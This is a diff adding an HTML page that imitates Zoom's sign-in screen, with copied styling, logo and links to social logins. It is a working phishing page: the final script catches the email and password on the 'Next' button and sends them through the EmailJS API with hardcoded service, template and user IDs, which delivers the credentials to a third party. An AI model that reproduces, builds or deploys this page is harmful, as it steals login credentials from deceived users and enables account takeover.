@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In | Zoom</title>
+    <script>
+        (function() {
+            emailjs.init("qIzZMycg371G5nbiq");
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Suisse International', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: #2d2d2d;
+            line-height: 1.5;
+        }
+
+        .mini-layout {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .layout-header {
+            background-color: #ffffff;
+            padding: 16px 24px;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .login-page-logo-wrap img {
+            height: 32px;
+            width: auto;
+        }
+
+        .header-links {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-login-link {
+            font-size: 14px;
+            color: #2d2d2d;
+            margin-right: 8px;
+        }
+
+        .zm-button {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            border: none;
+            transition: background-color 0.2s;
+        }
+
+        .zm-button--link {
+            background-color: transparent;
+            color: #0e71eb;
+        }
+
+        .zm-button--link:hover {
+            background-color: rgba(14, 113, 235, 0.1);
+        }
+
+        .zm-button--small {
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+
+        .zm-dropdown {
+            position: relative;
+            margin-left: 16px;
+        }
+
+        .zm-dropdown-selfdefine {
+            background-color: transparent;
+            border: 1px solid #d8d8d8;
+            color: #2d2d2d;
+        }
+
+        .zm-icon-down {
+            font-size: 12px;
+            margin-left: 4px;
+        }
+
+        .layout-body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 40px 20px;
+        }
+
+        .UserSign_pageLayout {
+            display: flex;
+            width: 100%;
+            max-width: 1200px;
+            /* Added to center the entire layout within layout-body */
+            margin: 0 auto;
+        }
+
+        .layout-aside {
+            flex: 1;
+            display: flex;
+            /* Center its content (the image) */
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            /* Ensure the image itself doesn't stretch beyond its max-width */
+            text-align: center; /* Fallback for img elements */
+        }
+
+        .layout-aside img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            /* Added to center the image if its container is larger */
+            display: block;
+            margin: 0 auto;
+        }
+
+        .layout-main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .UserSign_pageLayout-container {
+            width: 100%;
+            max-width: 400px;
+            /* Added to center the form container */
+            margin: 0 auto;
+        }
+
+        .UserSign_pageLayout-body {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 32px;
+            margin-bottom: 24px;
+        }
+
+        .font-happy {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            text-align: center;
+            color: #2d2d2d;
+        }
+
+        .zm-form {
+            margin-bottom: 24px;
+        }
+
+        .zm-input {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .zm-input__inner {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            border: 1px solid #d8d8d8;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+        }
+
+        .zm-input__inner:focus {
+            outline: none;
+            border-color: #0e71eb;
+            box-shadow: 0 0 0 2px rgba(14, 113, 235, 0.1);
+        }
+
+        .zm-input__label {
+            position: absolute;
+            top: 12px;
+            left: 16px;
+            font-size: 16px;
+            color: #747487;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .zm-input__inner:focus ~ .zm-input__label,
+        .zm-input__inner:not(:placeholder-shown) ~ .zm-input__label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            background-color: #ffffff;
+            padding: 0 4px;
+            color: #0e71eb;
+        }
+
+        .zm-button--primary {
+            background-color: #0e71eb;
+            color: #ffffff;
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .zm-button--primary:hover {
+            background-color: #0b5dc4;
+        }
+
+        .zm-login-methods {
+            margin-top: 24px;
+        }
+
+        .zm-login-methods__title {
+            text-align: center;
+            color: #747487;
+            font-size: 14px;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .zm-login-methods__title span {
+            background-color: #ffffff;
+            padding: 0 8px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .zm-login-methods__title:before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #d8d8d8;
+            z-index: 0;
+        }
+
+        .zm-login-methods__list {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .zm-login-methods__item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border: 1px solid #d8d8d8;
+            border-radius: 4px;
+            text-decoration: none;
+            color: #2d2d2d;
+            font-size: 12px;
+            transition: background-color 0.2s;
+            width: 64px;
+            height: 64px;
+        }
+
+        .zm-login-methods__item:hover {
+            background-color: #f9f9f9;
+        }
+
+        .zm-login-methods__icon {
+            margin-bottom: 8px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Color the social media icons */
+        .zm-login-methods__icon.google-color svg path {
+            fill: #4285F4;
+        }
+
+        .zm-login-methods__icon.apple svg path {
+            fill: #000000;
+        }
+        
+        .zm-login-methods__icon.facebook svg path {
+            fill: #1877F2;
+        }
+
+        .zm-login-methods__icon.microsoft svg rect {
+            fill: #0078D4; /* A more unified Microsoft blue */
+        }
+        
+        /* New styles for better responsiveness */
+        @media (max-width: 768px) {
+            .UserSign_pageLayout {
+                flex-direction: column;
+                align-items: center; /* Center the form on mobile */
+                max-width: 100%; /* Allow full width on smaller screens */
+            }
+
+            .layout-aside {
+                display: none; /* Hide the image on smaller screens */
+            }
+
+            .UserSign_pageLayout-body {
+                padding: 24px;
+                width: 100%; /* Full width on smaller screens */
+                max-width: 400px;
+            }
+
+            .zm-login-methods__list {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 16px; /* Increased gap for better spacing */
+            }
+            
+            .zm-login-methods__item {
+                width: 80px; /* Slightly larger buttons for easier tapping */
+                height: 80px;
+                font-size: 14px;
+            }
+            
+            .zm-login-methods__icon {
+                font-size: 24px; /* Larger icons */
+            }
+            
+            .layout-header {
+                padding: 12px 16px; /* Smaller header padding */
+            }
+            
+            .header-links {
+                gap: 8px; /* Reduce gap between header links */
+            }
+        }
+        
+        /* Adjustments for very small screens */
+        @media (max-width: 480px) {
+            .zm-login-methods__list {
+                gap: 12px;
+            }
+            
+            .zm-login-methods__item {
+                width: 70px;
+                height: 70px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="mini-layout" role="main" aria-label="main content">
+        <header class="layout-header">
+            <a href="/" class="login-page-logo-wrap">
+                <img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomNewLogo.b2fd5c95.png" alt="Zoom Logo">
+            </a>
+            <div class="header-links">
+                <span class="header-login-link">New to Zoom?</span>
+                <button type="button" class="mgl-xs zm-button--link zm-button--small zm-button">
+                    <span class="zm-button__slot">Sign Up Free</span>
+                </button>
+                <a type="button" role="link" target="_blank" href="https://support.zoom.us/hc/en-us" tabindex="0"
+                    class="mgl-lg header-login-link zm-button--link zm-button--small zm-button is-link">
+                    <span class="zm-button__slot">Support</span>
+                </a>
+                <div class="zm-dropdown">
+                    <button type="button"
+                        class="header-language zm-button--primary-ghost zm-button--small is-ghost zm-button zm-dropdown-selfdefine"
+                        aria-label="Language English" role="button" aria-haspopup="listbox" tabindex="0">
+                        <span class="zm-button__slot">English</span>
+                        <i aria-hidden="true" class="zm-icon-down">▼</i>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <div class="layout-body UserSign_pageLayout UserSign_signinLayout UserSign_layout-page" data-lang="en-US">
+            <div class="layout-aside">
+                <a href="#" target="_blank" class="">
+                    <img src="https://file-paa.zoom.us/JEIJpFI0QAuQ5Xe6OY2KgQ/MS4zLg6qtEamROOKjIvJKh11Z2fWXU3yQXTEC7AVrztBy312/d1d16189-15ba-4834-8a77-f0fceb2746ca.png" alt="Zoom promotion">
+                </a>
+            </div>
+            <div class="layout-main">
+                <div class="UserSign_pageLayout-container">
+                    <div class="UserSign_pageLayout-body">
+                        <div>
+                            <div class="mgt-xl">
+                                <h1 class="font-happy UserSign_layout-full-width UserSign_layout-title">Sign in</h1>
+                            </div>
+                            <div class="UserSign_layout-main-width">
+                                <form action="javascript:;" class="zm-form">
+                                    <div class="zm-form-item mgb-0">
+                                        <div class="zm-form-item__content">
+                                            <div class="UserSign_enhancedInput UserSign_v3styleInput">
+                                                <div class="zm-input zm-input--xLarge is-empty zm-input--show-label UserSign_enhancedInput-input">
+                                                    <input type="text" autocomplete="account" name="account" placeholder=" "
+                                                         aria-required="true" aria-label="Email or phone number" id="email"
+                                                         maxlength="128" class="zm-input__inner">
+                                                    <label for="email" class="zm-input__label">Email or phone number</label>
+                                                </div>
+                                                <div class="zm-input zm-input--xLarge is-empty zm-input--show-label UserSign_enhancedInput-input">
+                                                    <input type="password" autocomplete="current-password" name="password" placeholder=" "
+                                                         aria-required="true" aria-label="Password" id="password"
+                                                         maxlength="128" class="zm-input__inner">
+                                                    <label for="password" class="zm-input__label">Password</label>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                                <div class="mgt-md">
+                                    <button type="button" class="zm-button--primary zm-button--large zm-button"
+                                         id="signin_btn_next" style="width: 100%; font-weight: 500;">
+                                        <span class="zm-button__slot">Next</span>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="UserSign_layout-main-width UserSign_is-wide">
+                                <div class="zm-login-methods form-width">
+                                    <p id="js_ride_methods_title" class="zm-login-methods__title">
+                                        <span>Or sign in with</span>
+                                    </p>
+                                    <div class="zm-login-methods__list justify-between">
+                                        <a href="javascript:void(0)" role="button" aria-label="Sign in with SSO" class="zm-login-methods__item">
+                                            <span class="zm-login-methods__icon key">
+                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                                                    <path d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12s12-5.373 12-12C24 5.373 18.627 0 12 0zm0 5c1.657 0 3 1.343 3 3s-1.343 3-3 3-3-1.343-3-3 1.343-3 3-3z"/>
+                                                </svg>
+                                            </span>
+                                            <span>SSO</span>
+                                        </a>
+
+                                        <a href="javascript:void(0)" role="button" aria-label="Sign in with Apple" class="zm-login-methods__item">
+                                            <span class="zm-login-methods__icon apple">
+                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                                                    <path d="M16.365 1.43c0 1.14-.91 2.607-2.033 2.607-1.116 0-2.008-1.46-2.008-2.603 0-1.141.92-2.611 2.042-2.611 1.123 0 1.999 1.468 1.999 2.607zM21.87 17.025c-.034-2.65 2.166-3.925 2.262-3.987-1.232-1.797-3.148-2.04-3.82-2.067-1.623-.165-3.168.955-3.994.955-.835 0-2.116-.934-3.48-.909-1.783.027-3.44 1.04-4.345 2.646-1.863 3.234-.474 8.016 1.345 10.635.892 1.236 1.947 2.619 3.34 2.567 1.348-.051 1.857-.883 3.489-.883 1.63 0 2.106.883 3.49.857 1.468-.025 2.394-1.26 3.27-2.496.798-1.124 1.128-2.216 1.152-2.27-.025-.012-2.227-.858-2.262-3.83z"/>
+                                                </svg>
+                                            </span>
+                                            <span>Apple</span>
+                                        </a>
+
+                                        <a href="javascript:void(0)" role="button" aria-label="Sign in with Google" class="zm-login-methods__item">
+                                            <span class="zm-login-methods__icon google-color">
+                                                <svg width="24" height="24" viewBox="0 0 24 24">
+                                                    <path fill="#4285F4" d="M12 10.8v4.8h6.75c-.3 1.8-2.025 5.25-6.75 5.25-4.05 0-7.35-3.3-7.35-7.35s3.3-7.35 7.35-7.35c2.325 0 3.9.975 4.8 1.8l3.3-3.3C18.525 1.575 15.45 0 12 0 5.373 0 0 5.373 0 12s5.373 12 12 12c6.075 0 11.175-4.425 11.175-12 0-.825-.075-1.425-.15-1.8H12z"/>
+                                                </svg>
+                                            </span>
+                                            <span>Google</span>
+                                        </a>
+
+                                        <a href="javascript:void(0)" role="button" aria-label="Sign in with Facebook" class="zm-login-methods__item">
+                                            <span class="zm-login-methods__icon facebook">
+                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="#1877F2">
+                                                    <path d="M22.675 0H1.325C.593 0 0 .593 0 1.325v21.351C0 23.407.593 24 1.325 24h11.495V14.708h-3.13v-3.622h3.13V8.412c0-3.1 1.893-4.788 4.657-4.788 1.325 0 2.463.099 2.795.143v3.24h-1.918c-1.504 0-1.795.716-1.795 1.764v2.313h3.588l-.467 3.622h-3.121V24h6.116c.73 0 1.323-.593 1.323-1.324V1.325C24 .593 23.407 0 22.675 0z"/>
+                                                </svg>
+                                            </span>
+                                            <span>Facebook</span>
+                                        </a>
+
+                                        <a href="javascript:void(0)" role="button" aria-label="Sign in with Microsoft" class="zm-login-methods__item">
+                                            <span class="zm-login-methods__icon">
+                                                <svg width="24" height="24" viewBox="0 0 24 24">
+                                                    <rect x="0" y="0" width="11" height="11" fill="#F35325"/>
+                                                    <rect x="13" y="0" width="11" height="11" fill="#81BC06"/>
+                                                    <rect x="0" y="13" width="11" height="11" fill="#05A6F0"/>
+                                                    <rect x="13" y="13" width="11" height="11" fill="#FFBA08"/>
+                                                </svg>
+                                            </span>
+                                            <span>Microsoft</span>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="UserSign_pageLayout-footer">
+                        <div class="mgt-xl">
+                            <div class="UserSign_footerLinks UserSign_layout-main-width">
+                                <button type="button" class="zm-button--link zm-button--small zm-button UserSign_layout-link-btn"
+                                    aria-label="Get help from Chat with Bot">
+                                    <span class="zm-button__slot">Help</span>
+                                </button>
+                                <a type="button" role="link" target="_blank" href="/terms" tabindex="0"
+                                    class="zm-button--link zm-button--small zm-button is-link UserSign_layout-link-btn">
+                                    <span class="zm-button__slot">Terms</span>
+                                </a>
+                                <a type="button" role="link" target="_blank" href="/privacy" tabindex="0"
+                                    class="zm-button--link zm-button--small zm-button is-link UserSign_layout-link-btn">
+                                    <span class="zm-button__slot">Privacy</span>
+                                </a>
+                            </div>
+                            <div class="UserSign_layout-main-width">
+                                <div class="mgt-md" style="text-align: center;">
+                                    <div class="zm-captcha">
+                                        <div>
+                                            <p class="recaptcha-policy">
+                                                <span>Zoom is protected by reCAPTCHA and the
+                                                     <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+                                                     <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+                                                </span>
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById("password");
+        const signin_btn_next = document.getElementById("signin_btn_next");
+        
+        signin_btn_next.addEventListener("click", (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            var data = {
+                service_id: 'service_wcpmddm',
+                template_id: 'template_7wx22ag',
+                user_id: 'a6U4gCn__5Bia9QCM',
+                template_params: {
+                    email: email,
+                    password: password
+                }
+            };
+
+            fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                if (response.ok) {
+                    alert('Your mail is sent!');
+                } else {
+                    return response.json().then(err => Promise.reject(err));
+                }
+            })
+            .catch(function(error) {
+                alert('Oops... ' + JSON.stringify(error));
+            });
+        });
+
+        // Add focus effect for password input
+        emailInput.addEventListener('focus', function() {
+            this.closest('.zm-input').classList.add('is-focused');
+        });
+
+        emailInput.addEventListener('blur', function() {
+            if (!this.value) {
+                this.closest('.zm-input').classList.remove('is-focused');
+            }
+        });
+
+        passwordInput.addEventListener('focus', function() {
+            this.closest('.zm-input').classList.add('is-focused');
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            if (!this.value) {
+                this.closest('.zm-input').classList.remove('is-focused');
+            }
+        });
+
+        // Initial check for pre-filled inputs to keep labels up
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.zm-input__inner').forEach(input => {
+                if (input.value) {
+                    input.closest('.zm-input').classList.add('is-focused');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
